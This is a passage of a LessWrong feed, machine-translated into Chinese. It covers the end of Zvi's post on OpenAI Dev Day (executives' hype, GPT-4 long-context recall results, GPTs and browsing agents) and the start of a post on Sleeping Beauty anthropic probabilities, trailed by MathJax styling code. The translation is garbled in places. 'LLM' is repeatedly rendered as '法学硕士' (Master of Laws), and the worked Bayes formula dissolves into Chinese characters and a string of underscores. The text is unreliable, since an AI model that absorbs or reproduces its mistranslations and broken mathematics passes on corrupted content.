src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/qtEgaxSFxYanT5QbJ/giffdbroph8owgkinvvj" alt="🤯" style="height:1em;max-height:1em"></p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3f5e7800-b56a-439f-bc89-83c41f2d06f1_1661x1180.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/wdekcGpsMtakGCo5y/vvcjxylgwbrbfj1guke7" alt="图像"></a></figure><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/mckaywrigley/status/1721638116010983545">McKay Wrigley</a> ：OpenAI DevDay 令我震惊……我无法用语言表达世界发生了多大变化。这是 1000 倍的改进。我们生活在人工智能革命的起步阶段，它将给我们带来一个超乎我们最疯狂梦想的黄金时代。是时候建造了。</p><p>有趣的是，我原来打的是100x，后来改成了1000x。这些显然是无法衡量的，但却更准确地传达了我的感受。我认为人们并没有真正掌握（包括我自己！）刚刚解锁的内容以及即将发生的内容。</p></blockquote><p>看，不，停下来。这东西很酷。我非常兴奋能够使用 GPT 和更长的上下文窗口以及功能集成。是不是比之前的情况都高了三个数量级？我的意思是，说真的，你到底在说什么？我知道言语没有意义，但是数字这个神圣的信任又如何呢？</p><p>我想，如果你认为它是“好十倍”，意思是“足够好，你可以利用这个优势来取代现有的服务”，而不是“这是有用或有价值的十倍”，那么是的，如果他们这样做了他们的工作看起来好十倍。甚至可能好十倍。但将其相乘至多是混合隐喻，这并不合理地构成三个连续的此类破坏。</p><p>除非这些新代理实际上比任何人预期的效果都要好得多，在这种情况下谁知道呢。我会注意到，如果是这样，这似乎并不是特别……好……消息，以一种“我希望我们不会都快要死”的方式。</p><p>还值得注意的是，这一切都意味着当 GPT-5 确实到来时，所有这些基础设施都在等待，这会突然变得非常有趣。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/paulg/status/1721899873069609119">保罗·格雷厄姆转发了上面的引文，以及相关的引文</a>：</p><blockquote><p> Paul Graham：这不是一个随机的技术梦想家。这是一家真正的人工智能公司的首席执行官。 So when he says more has happened in the last year than the previous ten, it&#39;s not just a figure of speech.</p><p> Alexander Wang（Scale AI 首席执行官）：人工智能的最后一年发生的事情比前十年还要多，毫无疑问，我们正处于我们余生中最重要的技术的火热起飞中，每个人——政府、公民、技术专家——都在等待着人工智能的到来。 /屏住呼吸（有些无奈）人类的下一个版本。</p></blockquote><p>担任人工智能公司的首席执行官似乎与传统上所谓的“炒作”并不矛盾。当人工智能领域的人们谈论十的因数时，人们不能自动从表面上理解它，正如我们在上面看到的那样。</p><p>另外，是的，“人类的下一个版本”听起来很像科技所说的“我们也很可能会死，但这是一件好事”。</p><p> Ben Thompson 报道了很多主题演讲， <a target="_blank" rel="noreferrer noopener" href="https://stratechery.com/2023/the-openai-keynote/">并发现这是一次出色的主题演讲</a>，这也许是他们将卷土重来的迹象。虽然他发现新的 GPT 令人兴奋，但他关注的是我最初关注的业务影响，即普通和无缝的功能改进。</p><p>用户可以获得更快的响应、更大的上下文窗口、更多最新的知识，以及更好地整合网页浏览、视觉、听觉、语音和图像生成的模式。生活质量的改善、摆脱烦恼、填补实际差距，这些都产生了巨大的边际差异。</p><p>新的上下文窗口有多好？ <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/GregKamradt/status/1722386725635580292">格雷格·卡姆拉特报道</a>。</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7e35c02b-8542-498b-9764-ce08244df7a0_3426x1794.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/wdekcGpsMtakGCo5y/bsi1t8e7vtlr960dnm1v" alt="图像"></a></figure><blockquote><p>发现：</p><p> * GPT-4 的召回性能在 73K 代币以上开始下降</p><p>* 当要召回的事实位于 7%-50% 文档深度之间时，低召回性能相关</p><p>* 如果事实位于文档的开头，则无论上下文长度如何，都会调用该事实</p><p>那么又怎样： * 不保证 – 不保证您的事实能够被检索到。不要将它们的假设融入到您的应用程序中</p><p>* 更少的上下文 = 更高的准确性——这是众所周知的，但如果可能的话，请减少发送到 GPT-4 的上下文量，以提高其回忆能力</p><p>* 位置很重要——这也是众所周知的，但放在文件开头和后半部分的事实似乎更容易被记住。</p></blockquote><p>允许 128k 甚至更多令牌是有意义的，即使从 73k 左右开始性能就会下降。出于实际目的，听起来我们想坚持较小的金额，但最好不要降低硬上限。</p><p> Thompson 认为基本 UI（基本上根本没有 UI）是大多数用户想要保留的地方并且是最重要的，这一点正确吗？或者我们会一直使用 GPT？</p><p>从短期来看，他显然是正确的。渐进式的改进更重要。但是，当我们学会快速、肮脏和定制地为自己构建 GPT，并学会使用其他人的 GPT 时，我预计会有非常大的附加值，即使是“你找到了适合你的 1-3 个，并且总是使用它们。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/KevinAFischer/status/1722437985424298181">Kevin Fisher 也指出了</a>我发现的一些事情：法学硕士可以在紧要关头使用网络浏览，但当你有选择时，你通常会想避免这种情况。 “不要使用网页浏览”有时是一条很好的信息。凯文最关心的是速度，但我也发现了其他问题。</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/var_epsilon/status/1722377406701269118">Nathan Lebenz 在最近的播客中建议</a>，杀手级集成是 GPT-4V 加上网页浏览，允许法学硕士浏览网页并完成任务。 <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/var_epsilon/status/1722377406701269118">这</a>是<a target="_blank" rel="noreferrer noopener" href="https://t.co/KW6WbK9ZsH">vimGPT</a> ，第一次尝试。 <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sharqwy/status/1722598403925033388">这里还有一些演示</a>。我们应该给人们时间看看他们能想出什么办法。</p><p>目前明显缺乏的是使 GPT 在一组可用 GPT 之间进行选择，然后无缝调用最适合您的查询的能力。这将把功能结合到文本框和附件按钮的隐形“终极”用户界面中，这是现有基本模式之间无缝切换的扩展。目前，人们可能仍然可以通过调用其他随后调用 GPT 的东西来完成这一“困难的方式”。</p><br/><br/><a href="https://www.lesswrong.com/posts/wdekcGpsMtakGCo5y/on-openai-dev-day#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/wdekcGpsMtakGCo5y/on-openai-dev-day<guid ispermalink="false"> wdekcGpsMtakGCo5y</guid><dc:creator><![CDATA[Zvi]]></dc:creator><pubDate> Thu, 09 Nov 2023 16:10:10 GMT</pubDate> </item><item><title><![CDATA[Antropical  probabilities are fully explained by difference in possible outcomes]]></title><description><![CDATA[Published on November 9, 2023 3:34 PM GMT<br/><br/><p><i>这是我的人类学系列的第三篇文章。上一篇是</i><a href="https://www.lesswrong.com/posts/uEP3P6AuNjYaFToft/conservation-of-expected-evidence-and-random-sampling-in"><i>人类学中预期证据守恒和随机抽样</i></a></p><h3>介绍</h3><p><a href="https://www.lesswrong.com/posts/uEP3P6AuNjYaFToft/conservation-of-expected-evidence-and-random-sampling-in">在上一篇文章中，</a>我认为，正确地进行人择学所需要做的就是确保遵循预期证据守恒。没有第一人称魔法。重要的是环境的因果结构——是否有随机抽样以及原则上可以观察到什么样的证据。</p><p>然而，这可能会被错误地解释为第一人称视角和第三人称视角之间不应该有任何差异。了解你的存在应该为你提供与其他人了解你的存在完全相同的信息。</p><p> This is not the case.人们的观点之间可能存在有效的差异。但它们必须以抽样和预期证据的差异为基础，与形而上学无关。</p><h3>美女与访客的分歧</h3><p>让我们来研究一下睡美人孵化器（ISBV）：</p><blockquote><p><i>您是“睡美人孵化器”实验的观察者。你不知道抛硬币的结果，但你观察了一个房间，在两个房间中随机选择，发现那里有一个美女。硬币正面朝上的概率是多少？然后您注意到这是 1 号房间。现在硬币正面朝上的概率是多少？</i></p></blockquote><p>我们从第一个问题开始吧。有两个房间和两个硬币面。在四种可能的结果之一中，房间是空的。所以</p><p><span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(Heads|NotEmpty) = P(NotEmpty|Heads)P(Heads)/P(NotEmpty) = 1/3"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">|</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">不</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">为</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">空</span></span><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">不</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">为</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">空</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">|</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">头</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.446em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.446em;">头</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">/</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">不</span></span><span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">E</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.085em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">m</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.446em;">p</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.519em; padding-right: 0.006em;">y</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mn MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">/</span></span></span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">3</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">_</span></span></span></span></span></span></span> <style>.mjx-chtml {display: inline-block; line-height: 0; text-indent: 0; text-align: left; text-transform: none; font-style: normal; font-weight: normal; font-size: 100%; font-size-adjust: none; letter-spacing: normal; word-wrap: normal; word-spacing: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; margin: 0; padding: 1px 0}
.MJXc-display {display: block; text-align: center; margin: 1em 0; padding: 0}
.mjx-chtml[tabindex]:focus, body :focus .mjx-chtml[tabindex] {display: inline-table}
.mjx-full-width {text-align: center; display: table-cell!important; width: 10000em}
.mjx-math {display: inline-block; border-collapse: separate; border-spacing: 0}
.mjx-math * {display: inline-block; -webkit-box-sizing: content-box!important; -moz-box-sizing: content-box!important; box-sizing: content-box!important; text-align: left}
.mjx-numerator {display: block; text-align: center}
.mjx-denominator {display: block; text-align: center}
.MJXc-stacked {height: 0; position: relative}
.MJXc-stacked > * {position: absolute}
.MJXc-bevelled > * {display: inline-block}
.mjx-stack {display: inline-block}
.mjx-op {display: block}
.mjx-under {display: table-cell}
.mjx-over {display: block}
.mjx-over > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-under > * {padding-left: 0px!important; padding-right: 0px!important}
.mjx-stack > .mjx-sup {display: block}
.mjx-stack > .mjx-sub {display: block}
.mjx-prestack > .mjx-presup {display: block}
.mjx-prestack > .mjx-presub {display: block}
.mjx-delim-h > .mjx-char {display: inline-block}
.mjx-surd {vertical-align: top}
.mjx-surd + .mjx-box {display: inline-flex}
.mjx-mphantom * {visibility: hidden}
.mjx-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 2px 3px; font-style: normal; font-size: 90%}
.mjx-annotation-xml {line-height: normal}
.mjx-menclose > svg {fill: none; stroke: currentColor; overflow: visible}
.mjx-mtr {display: table-row}
.mjx-mlabeledtr {display: table-row}
.mjx-mtd {display: table-cell; text-align: center}
.mjx-label {display: table-row}
.mjx-box {display: inline-block}
.mjx-block {display: block}
.mjx-span {display: inline}
.mjx-char {display: block; white-space: pre}
.mjx-itable {display: inline-table; width: auto}
.mjx-row {display: table-row}
.mjx-cell {display: table-cell}
.mjx-table {display: table; width: 100%}
.mjx-line {display: block; height: 0}
.mjx-strut {width: 0; padding-top: 1em}
.mjx-vsize {width: 0}
.MJXc-space1 {margin-left: .167em}
.MJXc-space2 {margin-left: .222em}
.MJXc-space3 {margin-left: .278em}
.mjx-test.mjx-test-display {display: table!important}
.mjx-test.mjx-test-inline {display: inline!important; margin-right: -1px}
.mjx-test.mjx-test-default {display: block!important; clear: both}
.mjx-ex-box {display: inline-block!important; position: absolute; overflow: hidden; min-height: 0; max-height: none; padding: 0; border: 0; margin: 0; width: 1px; height: 60ex}
.mjx-test-inline .mjx-left-box {display: inline-block; width: 0; float: left}
.mjx-test-inline .mjx-right-box {display: inline-block; width: 0; float: right}
.mjx-test-display .mjx-right-box {display: table-cell!important; width: 10000em!important; min-width: 0; max-width: none; padding: 0; border: 0; margin: 0}
.MJXc-TeX-unknown-R {font-family: monospace; font-style: normal; font-weight: normal}
.MJXc-TeX-unknown-I {font-family: monospace; font-style: italic; font-weight: normal}
.MJXc-TeX-unknown-B {font-family: monospace; font-style: normal; font-weight: bold}
.MJXc-TeX-unknown-BI {font-family: monospace; font-style: italic; font-weight: bold}
.MJXc-TeX-ams-R {font-family: MJXc-TeX-ams-R,MJXc-TeX-ams-Rw}
.MJXc-TeX-cal-B {font-family: MJXc-TeX-cal-B,MJXc-TeX-cal-Bx,MJXc-TeX-cal-Bw}
.MJXc-TeX-frak-R {font-family: MJXc-TeX-frak-R,MJXc-TeX-frak-Rw}
.MJXc-TeX-frak-B {font-family: MJXc-TeX-frak-B,MJXc-TeX-frak-Bx,MJXc-TeX-frak-Bw}
.MJXc-TeX-math-BI {font-family: MJXc-TeX-math-BI,MJXc-TeX-math-BIx,MJXc-TeX-math-BIw}
.MJXc-TeX-sans-R {font-family: MJXc-TeX-sans-R,MJXc-TeX-sans-Rw}
.MJXc-TeX-sans-B {font-family: MJXc-TeX-sans-B,MJXc-TeX-sans-Bx,MJXc-TeX-sans-Bw}
.MJXc-TeX-sans-I {font-family: MJXc-TeX-sans-I,MJXc-TeX-sans-Ix,MJXc-TeX-sans-Iw}
.MJXc-TeX-script-R {font-family: MJXc-TeX-script-R,MJXc-TeX-script-Rw}
.MJXc-TeX-type-R {font-family: MJXc-TeX-type-R,MJXc-TeX-type-Rw}
.MJXc-TeX-cal-R {font-family: MJXc-TeX-cal-R,MJXc-TeX-cal-Rw}
.MJXc-TeX-main-B {font-family: MJXc-TeX-main-B,MJXc-TeX-main-Bx,MJXc-TeX-main-Bw}
.MJXc-TeX-main-I {font-family: MJXc-TeX-main-I,MJXc-TeX-main-Ix,MJXc-TeX-main-Iw}
.MJXc-TeX-main-R {font-family: MJXc-TeX-main-R,MJXc-TeX-main-Rw}
.MJXc-TeX-math-I {font-family: MJXc-TeX-math-I,MJXc-TeX-math-Ix,MJXc-TeX-math-Iw}
.MJXc-TeX-size1-R {font-family: MJXc-TeX-size1-R,MJXc-TeX-size1-Rw}
.MJXc-TeX-size2-R {font-family: MJXc-TeX-size2-R,MJXc-TeX-size2-Rw}
.MJXc-TeX-size3-R {font-family: MJXc-TeX-size3-R,MJXc-TeX-size3-Rw}
.MJXc-TeX-size4-R {font-family: MJXc-TeX-size4-R,MJXc-TeX-size4-Rw}
.MJXc-TeX-vec-R {font-family: MJXc-TeX-vec-R,MJXc-TeX-vec-Rw}
.MJXc-TeX-vec-B {font-family: MJXc-TeX-vec-B,MJXc-TeX-vec-Bx,MJXc-TeX-vec-Bw}
@font-face {font-family: MJXc-TeX-ams-R; src: local('MathJax_AMS'), local('MathJax_AMS-Regular')}
@font-face {font-family: MJXc-TeX-ams-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_AMS-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_AMS-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_AMS-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-B; src: local('MathJax_Caligraphic Bold'), local('MathJax_Caligraphic-Bold')}
@font-face {font-family: MJXc-TeX-cal-Bx; src: local('MathJax_Caligraphic'); font-weight: bold}
@font-face {font-family: MJXc-TeX-cal-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-R; src: local('MathJax_Fraktur'), local('MathJax_Fraktur-Regular')}
@font-face {font-family: MJXc-TeX-frak-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-frak-B; src: local('MathJax_Fraktur Bold'), local('MathJax_Fraktur-Bold')}
@font-face {font-family: MJXc-TeX-frak-Bx; src: local('MathJax_Fraktur'); font-weight: bold}
@font-face {font-family: MJXc-TeX-frak-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Fraktur-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Fraktur-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Fraktur-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-BI; src: local('MathJax_Math BoldItalic'), local('MathJax_Math-BoldItalic')}
@font-face {font-family: MJXc-TeX-math-BIx; src: local('MathJax_Math'); font-weight: bold; font-style: italic}
@font-face {font-family: MJXc-TeX-math-BIw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-BoldItalic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-BoldItalic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-BoldItalic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-R; src: local('MathJax_SansSerif'), local('MathJax_SansSerif-Regular')}
@font-face {font-family: MJXc-TeX-sans-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-B; src: local('MathJax_SansSerif Bold'), local('MathJax_SansSerif-Bold')}
@font-face {font-family: MJXc-TeX-sans-Bx; src: local('MathJax_SansSerif'); font-weight: bold}
@font-face {font-family: MJXc-TeX-sans-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-sans-I; src: local('MathJax_SansSerif Italic'), local('MathJax_SansSerif-Italic')}
@font-face {font-family: MJXc-TeX-sans-Ix; src: local('MathJax_SansSerif'); font-style: italic}
@font-face {font-family: MJXc-TeX-sans-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_SansSerif-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_SansSerif-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_SansSerif-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-script-R; src: local('MathJax_Script'), local('MathJax_Script-Regular')}
@font-face {font-family: MJXc-TeX-script-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Script-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Script-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Script-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-type-R; src: local('MathJax_Typewriter'), local('MathJax_Typewriter-Regular')}
@font-face {font-family: MJXc-TeX-type-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Typewriter-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Typewriter-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Typewriter-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-R; src: local('MathJax_Caligraphic'), local('MathJax_Caligraphic-Regular')}
